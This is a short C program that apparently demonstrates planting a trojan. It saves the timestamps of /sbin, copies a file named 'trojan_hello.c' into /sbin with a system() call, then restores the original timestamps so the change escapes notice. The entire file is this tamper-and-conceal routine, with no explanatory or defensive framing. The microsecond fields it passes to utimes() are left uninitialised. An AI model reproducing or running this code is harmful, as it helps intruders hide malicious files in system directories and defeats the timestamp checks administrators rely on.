#include <errno.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>

int main()
{
    struct stat sb;
    struct timeval time[2];

    if (stat("/sbin", &sb) < 0) {
        fprintf(stderr, "STAT ERROR: %d\n", errno);
        return 1;
    }

    time[0].tv_sec = sb.st_atime;
    time[1].tv_sec = sb.st_mtime;

    system("cp -f trojan_hello.c /sbin/");
    
    if (utimes("/sbin", (struct timeval *)&time) < 0) {
        fprintf(stderr, "UTIMES ERROR: %d\n", errno);
        return 1;
    }

    return 0;
}
